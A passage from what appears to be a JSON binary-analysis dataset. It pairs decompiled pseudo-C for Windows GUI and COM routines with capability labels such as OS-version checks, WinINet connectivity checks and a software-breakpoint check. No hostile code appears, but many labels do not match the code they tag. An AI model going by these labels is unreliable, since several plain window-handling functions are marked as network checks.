fcn.00458f1d();\n    return;\n}\n",
        "token_count": 4945
    },
    "0044b674": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0044b674(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.00450eaf();\n    fcn.00450053();\n    fcn.0044fa7f();\n    if (param_1 == 0) {\n        iVar1 = fcn.0042536e();\n        if (iVar1 != 0) {\n            if (*(iVar1 + 0x40) != NULL) {\n                (**(**(iVar1 + 0x40) + 4))(1);\n            }\n            *(iVar1 + 0x40) = 0;\n        }\n        iVar1 = fcn.0042b206();\n        if (*(iVar1 + 0x100) == 1) {\n            (*_sym.imp.ole32.dll_CoFreeUnusedLibraries)();\n            (*_sym.imp.ole32.dll_OleUninitialize)();\n            *(iVar1 + 0x100) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "0044c220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044c220(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    if (arg_8h == 2) {\n        fcn.00421137();\n        if ((*(in_ECX + 0x164) & 0x40) != 0) {\ncode_r0x0044c2ce:\n            fcn.0041e5da();\n            return;\n        }\n        iVar2 = 1;\n        iVar1 = 0;\n        do {\n            if (*(in_ECX + 0x184) <= iVar2) break;\n            iVar1 = fcn.0044c09e();\n            iVar2 = iVar2 + 1;\n        } while (iVar1 == 0);\n        if (iVar1 != 0) goto code_r0x0044c269;\n    }\n    else {\n        if (7 < arg_8h - 10U) goto code_r0x0044c2ce;\n        fcn.00421137();\n        iVar2 = 1;\n        iVar1 = 0;\n        do {\n            if (*(in_ECX + 0x184) <= iVar2) break;\n            iVar1 = fcn.0044c09e();\n            iVar2 = iVar2 + 1;\n        } while (iVar1 == 0);\n        if ((iVar1 != 0) && (*(iVar1 + 0x90) != NULL)) {\n            (**(**(iVar1 + 0x90) + 4))(arg_8h, arg_ch, arg_10h);\n            return;\n        }\n    }\n    do {\n        iVar1 = fcn.0041901a();\ncode_r0x0044c269:\n    } while (*(iVar1 + 0x90) == 0);\n    (****(iVar1 + 0x90))(arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 438
    },
    "0044c414": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0044c414(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (0xffff < param_1) {\n        param_1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x20));\n        param_1 = param_1 & 0xffff;\n    }\n    iVar1 = fcn.0044c061(param_1, 0xffffffff);\n    if (0 < iVar1) {\n        fcn.00444e94(iVar1, 1);\n        piVar2 = fcn.0044be6c(iVar1 + -1);\n        if (*piVar2 == 0) {\n            piVar2 = fcn.0044be6c(iVar1);\n            if (*piVar2 == 0) {\n                fcn.00444e94(iVar1, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "0044c47b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044c47b(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    \n    if (in_ECX != NULL) goto code_r0x0044c48b;\n    do {\n        fcn.0041901a();\ncode_r0x0044c48b:\n    } while ((arg_8h == 0) || (iVar1 = fcn.0044c061(arg_8h, arg_ch),  iVar1 < 1));\n    if (arg_10h == 1) {\n        puVar2 = fcn.0044be6c(iVar1);\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x20));\n        *puVar2 = uVar3 & 0xffff;\n        fcn.0044be6c(iVar1);\n        iVar4 = fcn.0044c061();\n        if (0 < iVar4) {\n            fcn.00444e94(iVar1, 1);\n            piVar5 = fcn.0044be6c();\n            if ((*piVar5 == 0) && (piVar5 = fcn.0044be6c(),  *piVar5 == 0)) {\n                fcn.00444e94(iVar1, 1);\n            }\n        }\n    }\n    else {\n        fcn.00444e94(iVar1, 1);\n        piVar5 = fcn.0044be6c(iVar1 + -1);\n        if ((*piVar5 == 0) && (piVar5 = fcn.0044be6c(iVar1),  *piVar5 == 0)) {\n            fcn.00444e94(iVar1, 1);\n        }\n        if (arg_10h != -1) {\n            fcn.0044c414(arg_8h);\n        }\n    }\n    if (*(arg_8h + 0x90) != 0) {\n        piVar5 = fcn.004459bd();\n        if ((in_ECX[0x25] == 0) || (iVar1 = (**(*in_ECX + 0x16c))(),  iVar1 != 0)) {\n            piVar5[0x34] = piVar5[0x34] | 0xc;\n        }\n        else {\n            iVar1 = fcn.0044c3ac();\n            if (iVar1 == 0) {\n                (**(*piVar5 + 0x60))();\n                return 1;\n            }\n            fcn.004226fd(0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 638
    },
    "0044ce2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044ce2e(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint unaff_ESI;\n    uint uFlags;\n    uchar auStack308 [16];\n    int32_t iStack292;\n    int32_t iStack288;\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [88];\n    uchar auStack180 [172];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack180;\n    iStack288 = param_2;\n    iStack292 = param_3;\n    if (param_1 != 0) goto code_r0x0044ce69;\n    do {\n        fcn.0041901a();\ncode_r0x0044ce69:\n    } while (param_2 == 0);\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x20), auStack308);\n    if (*(param_2 + 0x8c) == param_1) {\n        if (param_3 == 0) goto code_r0x0044d054;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(auStack308, param_3);\n        if (iVar2 != 0) goto code_r0x0044d054;\n    }\n    if ((*(param_1 + 0x94) != 0) && ((*(param_2 + 0x84) & 0x40) != 0)) {\n        *(param_1 + 0x80) = *(param_1 + 0x80) | 0x40;\n    }\n    *(param_1 + 0x80) = *(param_1 + 0x80) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x80);\n    *(param_1 + 0x80) = *(param_2 + 0x80) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.00422e15(auStack268, 0x104);\n        fcn.00431d30(*(param_1 + 0x20), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x80) ^ *(param_1 + 0x80)) & 0xf000 ^ *(param_2 + 0x80);\n    if (*(param_1 + 0x94) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.0045190e(uVar3);\n    uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_2 + 0x20), 0xffffffff);\n    iVar2 = fcn.0044c061(uVar1);\n    if (0 < iVar2) {\n        piVar4 = fcn.0044be6c(iVar2);\n        *piVar4 = param_2;\n    }\n    if (iStack292 == 0) {\n        if (iVar2 < 1) {\n            fcn.00444dc0(*(param_1 + 0xa0), param_2);\n            fcn.00444dc0(*(param_1 + 0xa0), 0);\n        }\n        uFlags = 0x115;\n        iStack272 = 0;\n        iStack276 = 0;\n        iStack280 = -*0x4ad20c;\n        iStack284 = -*0x4ad208;\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack284, iStack292);\n        fcn.00419ea1();\n        if (iVar2 < 1) {\n            fcn.0044c0bd(iStack288, iStack284, iStack280, iStack276, iStack272, (iStack276 - iStack284) / 2 + iStack284\n                         , (iStack272 - iStack280) / 2 + iStack280);\n            param_2 = iStack288;\n        }\n        iStack272 = iStack272 - iStack280;\n        uFlags = 0x114;\n        iStack276 = iStack276 - iStack284;\n    }\n    fcn.00422a19(0, iStack284, iStack280, iStack276, iStack272, uFlags);\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x20));\n    iVar2 = fcn.0041e67e();\n    if (iVar2 != param_1) {\n        fcn.0044bea6(param_1);\n    }\n    if (*(param_2 + 0x8c) != 0) {\n        fcn.0044c47b(param_2, 0xffffffff, 0);\n    }\n    *(param_2 + 0x8c) = param_1;\n    iVar2 = fcn.004459bd();\n    *(iVar2 + 0xd0) = *(iVar2 + 0xd0) | 0xc;\ncode_r0x0044d054:\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 1235
    },
    "0044d863": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0044d863(uint hModule, int32_t hResInfo, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t *arg_8h;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    uint uVar11;\n    uint uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint hResData;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar5 = (*_sym.imp.KERNEL32.dll_LoadResource)(hModule, hResInfo);\n    piVar10 = piVar5;\n    if ((piVar5 != NULL) && (piVar6 = (*_sym.imp.KERNEL32.dll_LockResource)(piVar5),  piVar10 = piVar6,  piVar6 != NULL)\n       ) {\n        iVar14 = *piVar6 + 0x40;\n        arg_8h = fcn.004582da(iVar14);\n        piVar10 = arg_8h;\n        if (arg_8h != NULL) {\n            fcn.00417b17(arg_8h, iVar14, piVar6, iVar14);\n            pcVar3 = _sym.imp.USER32.dll_GetSysColor;\n            iVar14 = *arg_8h;\n            hResInfo = 0;\n            do {\n                puVar1 = arg_8h + hResInfo * 4 + iVar14;\n                iVar13 = 0;\n                do {\n                    if (*puVar1 == *(iVar13 * 8 + 0x490a24)) {\n                        if (arg_10h == 0) {\n                            puVar2 = iVar13 * 8 + 0x490a28;\n                            uVar7 = (*pcVar3)(*puVar2);\n                            uVar4 = (*pcVar3)(*puVar2);\n                            uVar8 = (*pcVar3)(*puVar2);\n                            *puVar1 = uVar8 >> 0x10 & 0xff | (uVar4 << 8 | uVar7 >> 8 & 0xff) << 8;\n                        }\n                        else if (*(iVar13 * 8 + 0x490a28) != 0x12) {\n                            *puVar1 = 0xffffff;\n                        }\n                        break;\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 4);\n                hResInfo = hResInfo + 1;\n            } while (hResInfo < 0x10);\n            iVar14 = arg_8h[1];\n            iVar13 = arg_8h[2];\n            uVar9 = (*_sym.imp.USER32.dll_GetDC)(0);\n            piVar10 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(uVar9, iVar14, iVar13);\n            if (piVar10 != NULL) {\n                uVar11 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(uVar9);\n                pcVar3 = _sym.imp.GDI32.dll_SelectObject;\n                uVar12 = (*_sym.imp.GDI32.dll_SelectObject)(uVar11, piVar10);\n                (*_sym.imp.GDI32.dll_StretchDIBits)\n                          (uVar11, 0, 0, iVar14, iVar13, 0, 0, iVar14, iVar13, \n                           piVar6 + (1 << (*(arg_8h + 0xe) & 0x1f)) + 10, arg_8h, 0, 0xcc0020);\n                (*pcVar3)(uVar11, uVar12);\n                (*_sym.imp.GDI32.dll_DeleteDC)(uVar11);\n            }\n            (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar9);\n            fcn.0045839d(arg_8h);\n            (*_sym.imp.KERNEL32.dll_FreeResource)(piVar5);\n        }\n    }\n    return piVar10;\n}\n",
        "token_count": 936
    },
    "0044e370": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044e370(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint dwNewLong;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    dwNewLong = 0;\n    var_4h = 0;\n    if (0x40046 < *0x4a9b88) {\n        dwNewLong = fcn.004225b8();\n        iVar3 = fcn.004225ec(0, 0x8800, 0);\n        if (0x5ffff < *0x4a9b88) {\n            if (in_ECX == 0) {\n                uVar1 = 0;\n            }\n            else {\n                uVar1 = *(in_ECX + 0x20);\n            }\n            iVar2 = (*_sym.imp.USER32.dll_IsWindow)(uVar1);\n            if (iVar2 != 0) {\n                fcn.0044d839();\n                var_4h = fcn.0044d84c();\n            }\n        }\n    }\n    iVar2 = fcn.0041e5da();\n    if (iVar2 != 0) {\n        *arg_8h = arg_ch;\n        arg_8h[1] = arg_ch >> 0x10;\n    }\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetWindowLongA)(*(in_ECX + 0x20), 0xfffffff0, dwNewLong);\n    }\n    if (var_4h != 0) {\n        fcn.0044d84c(var_4h);\n    }\n    return iVar2;\n}\n",
        "token_count": 396
    },
    "0044f1cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f1cc(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    int32_t var_3ch;\n    uint var_20h;\n    \n    if (arg_8h == 0) {\n        fcn.0041901a();\n    }\n    var_48h = arg_14h;\n    var_4ch = 1;\n    if (arg_ch != 0) {\n        var_4ch = 5;\n        var_3ch = arg_ch;\n    }\n    if (arg_10h != 0) {\n        var_20h = *(arg_10h + 4);\n        var_4ch = var_4ch | 0x80;\n    }\n    fcn.0044f0d2(arg_8h, &var_50h);\n    return;\n}\n",
        "token_count": 224
    },
    "0044f56d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044f56d(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *unaff_retaddr;\n    \n    if (param_3 != 0) {\n        *(param_1 + 4) = param_2;\n        *(param_1 + 0xc) = *0x495414;\n        *(param_1 + 0x10) = *0x495418;\n        *(param_1 + 0x14) = *0x49541c;\n        *(param_1 + 0x18) = *0x495420;\n        fcn.00430b55(param_1 + 0x1c);\n        fcn.00430b55(param_1 + 8);\n        *(param_1 + 8) = unaff_retaddr;\n        (**(*unaff_retaddr + 4))(unaff_retaddr);\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0044f6d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0044f6d8(int32_t param_1, int32_t param_2, uint param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    \n    if ((((*(param_1 + 4) != -1) && (*(param_1 + 4) == param_2)) && (*(param_1 + 0x1c) != 0)) &&\n       (iVar1 = fcn.00421c9c(param_1 + 0xc, param_3),  iVar1 != 0)) {\n        *param_4 = *(param_1 + 0x1c);\n        (**(**(param_1 + 0x1c) + 4))(*(param_1 + 0x1c));\n        return 1;\n    }\n    *param_4 = 0;\n    return 0;\n}\n",
        "token_count": 195
    },
    "0044fb39": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fb39(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4a) != '\\0') {\n        if (*(param_1 + 0x24) != 0) {\n            (*_sym.imp.ole32.dll_CoRevokeClassObject)(*(param_1 + 0x24));\n            *(param_1 + 0x24) = 0;\n        }\n        *(param_1 + 0x4a) = 0;\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "0044fb92": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.0044fb92(int32_t *param_1)\n\n{\n    uchar uVar1;\n    \n    if (*(param_1 + 0x12) == '\\0') {\n        uVar1 = (**(*param_1 + 0x60))();\n        *(param_1 + 0x49) = uVar1;\n        *(param_1 + 0x12) = 1;\n    }\n    return *(param_1 + 0x49);\n}\n",
        "token_count": 107
    },
    "00450479": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00450479(int16_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *arg_8h_00;\n    int16_t *piVar4;\n    int32_t *arg_ch_00;\n    int32_t in_ECX;\n    int16_t *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = NULL;\n    var_8h = 0;\n    if (*(in_ECX + 0x28) != 0) {\n        var_4h = 0;\n        do {\n            piVar4 = *(in_ECX + 0x20) + var_4h;\n            if ((*piVar4 == *arg_8h) && ((*(arg_8h + 8) & *(piVar4 + 8)) != 0)) {\n                iVar1 = *(piVar4 + 4);\n                if ((iVar1 != 2) && ((iVar1 != 4 && (*(piVar4 + 10) != 0)))) {\n                    iVar2 = *(piVar4 + 6);\n                    iVar3 = *(arg_8h + 6);\n                    if ((iVar2 != iVar3) && (((iVar2 != 0 || (iVar3 != -1)) && ((iVar2 != -1 || (iVar3 != 0))))))\n                    goto code_r0x0045051a;\n                }\n                if ((iVar1 == *(arg_8h + 4)) && (*(piVar4 + 0x10) == arg_ch)) {\n                    arg_ch_00 = *(arg_8h + 2);\n                    arg_8h_00 = *(piVar4 + 2);\n                    var_ch = piVar4;\n                    if (arg_8h_00 != NULL) {\n                        if ((arg_ch_00 == NULL) || (*arg_8h_00 != *arg_ch_00)) goto code_r0x0045051a;\n                        arg_ch_00 = fcn.0045ac18(arg_8h_00, arg_ch_00, *arg_8h_00);\n                    }\n                    if (arg_ch_00 == NULL) {\n                        return piVar4;\n                    }\n                }\n            }\ncode_r0x0045051a:\n            var_8h = var_8h + 1;\n            var_4h = var_4h + 0x24;\n        } while (var_8h < *(in_ECX + 0x28));\n    }\n    return var_ch;\n}\n",
        "token_count": 581
    },
    "004507c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004507c7(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *unaff_EBX;\n    uint *puVar5;\n    uint unaff_retaddr;\n    \n    puVar2 = fcn.00450479(param_2, param_3);\n    if (puVar2 == NULL) {\n        if ((*(param_1 + 0x20) == 0) || (*(param_1 + 0x28) == *(param_1 + 0x24))) {\n            iVar1 = (*(param_1 + 0x24) + *(param_1 + 0x2c)) * 0x24;\n            uVar3 = fcn.004170b4(-(iVar1 >> 0x20 != 0) | iVar1);\n            *(param_1 + 0x24) = *(param_1 + 0x24) + *(param_1 + 0x2c);\n            if (*(param_1 + 0x20) != 0) {\n                fcn.00417b17(uVar3, (*(param_1 + 0x24) + *(param_1 + 0x2c)) * 0x24, *(param_1 + 0x20), \n                             *(param_1 + 0x28) * 0x24);\n                fcn.004170df(*(param_1 + 0x20));\n            }\n            *(param_1 + 0x20) = uVar3;\n        }\n        puVar2 = *(param_1 + 0x28) * 0x24 + *(param_1 + 0x20);\n        *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    }\n    else {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(puVar2[1]);\n        (*_sym.imp.ole32.dll_ReleaseStgMedium)(puVar2 + 5);\n    }\n    puVar2[8] = unaff_retaddr;\n    puVar5 = puVar2;\n    for (iVar4 = 5; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *unaff_EBX;\n        unaff_EBX = unaff_EBX + 1;\n        puVar5 = puVar5 + 1;\n    }\n    return puVar2;\n}\n",
        "token_count": 566
    },
    "00450eec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450eec(int32_t param_1)\n\n{\n    if (*(param_1 + 0x20) != 0) {\n        (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(0, 0);\n        *(param_1 + 0x20) = 0;\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "0045151a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045151a(uint noname_0, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.004225b8();\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x20), &var_14h);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x21);\n    iVar4 = (*pcVar1)(0x20);\n    iVar5 = fcn.0041e5da();\n    if ((var_4h & 0x1000) != 0) {\n        if (iVar5 == 3) {\n            iVar5 = 2;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(2);\n        if (iVar2 < 0) {\n            return 0;\n        }\n    }\n    if (((9 < iVar5) && (iVar5 < 0x12)) || (iVar5 == 4)) {\n        if ((var_4h & 0x800) == 0) {\n            (*_sym.imp.USER32.dll_InflateRect)(&var_14h, -iVar4, -iVar3);\n            if ((var_4h & 0x200) != 0) {\n                if (iVar5 != 4) {\n                    if (iVar5 == 0xd) {\n                        return (arg_ch < var_10h) * 2 + 10;\n                    }\n                    if (iVar5 == 0xe) {\n                        return (arg_ch < var_10h) + 0xb;\n                    }\n                    if (iVar5 == 0x10) {\n                        return ((arg_ch <= var_8h) - 1 & 5) + 10;\n                    }\n                    if (iVar5 != 0x11) {\n                        return iVar5;\n                    }\n                }\n                iVar5 = (var_8h < arg_ch) * 4 + 0xb;\n            }\n        }\n        else {\n            iVar5 = 2;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 541
    },
    "00451a23": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451a23(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    if ((*(param_1 + 0x20) != 0) && (iVar2 = fcn.004459d1(),  iVar2 != 0)) {\n        piVar3 = fcn.004459bd();\n    // WARNING: Could not recover jumptable at 0x00451a41. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar4 = (**(*piVar3 + 0x60))();\n        return uVar4;\n    }\n    uVar4 = 0;\n    if (*(param_1 + 0x20) == 0) {\n        if (*(param_1 + 0x50) == 0) {\n            return 0;\n        }\n    }\n    else {\n        iVar2 = fcn.0041e60a(0);\n        if (iVar2 == 0) {\n            iStack20 = 0x4a8690;\n            fcn.00456b8d(&iStack20, 0x49ed44);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        iStack20 = 0x41e8f1;\n        fcn.0043179d();\n    }\n    iStack20 = *(param_1 + 0x20);\n    if ((iStack20 != 0) || (*(param_1 + 0x50) != 0)) {\n        if (*(param_1 + 0x50) == 0) {\n            uVar4 = (*_sym.imp.USER32.dll_DestroyWindow)();\n        }\n        else {\n            iStack20 = 0x41e913;\n            uVar4 = (**(**(param_1 + 0x50) + 0x58))();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 457
    },
    "00451b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00451b60(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_1 + 0x80);\n    if ((uVar1 & 0x100) != 0) {\n        *param_2 = *param_2 + *0x4ad208;\n    }\n    if ((uVar1 & 0x200) != 0) {\n        param_2[1] = param_2[1] + *0x4ad20c;\n    }\n    if ((uVar1 & 0x400) != 0) {\n        param_2[2] = param_2[2] - *0x4ad208;\n    }\n    if ((uVar1 & 0x800) != 0) {\n        param_2[3] = param_2[3] - *0x4ad20c;\n    }\n    if (param_3 == 0) {\n        *param_2 = *param_2 + *(param_1 + 100);\n        param_2[1] = param_2[1] + *(param_1 + 0x5c);\n        param_2[2] = param_2[2] - *(param_1 + 0x68);\n        param_2[3] = param_2[3] - *(param_1 + 0x60);\n        if ((*(param_1 + 0x80) & 0x400001) == 0x400000) {\n            param_2[1] = param_2[1] + 7;\n        }\n    }\n    else {\n        *param_2 = *param_2 + *(param_1 + 0x5c);\n        param_2[1] = param_2[1] + *(param_1 + 100);\n        param_2[2] = param_2[2] - *(param_1 + 0x60);\n        param_2[3] = param_2[3] - *(param_1 + 0x68);\n        if ((*(param_1 + 0x80) & 0x400001) == 0x400000) {\n            *param_2 = *param_2 + 7;\n        }\n    }\n    return;\n}\n",
        "token_count": 525
    },
    "00451ce8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451ce8(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_ch == 0) || (arg_10h == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0x7fff;\n    }\n    *arg_8h = uVar1;\n    if ((arg_ch == 0) || (arg_10h != 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0x7fff;\n    }\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 160
    },
    "00451d56": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
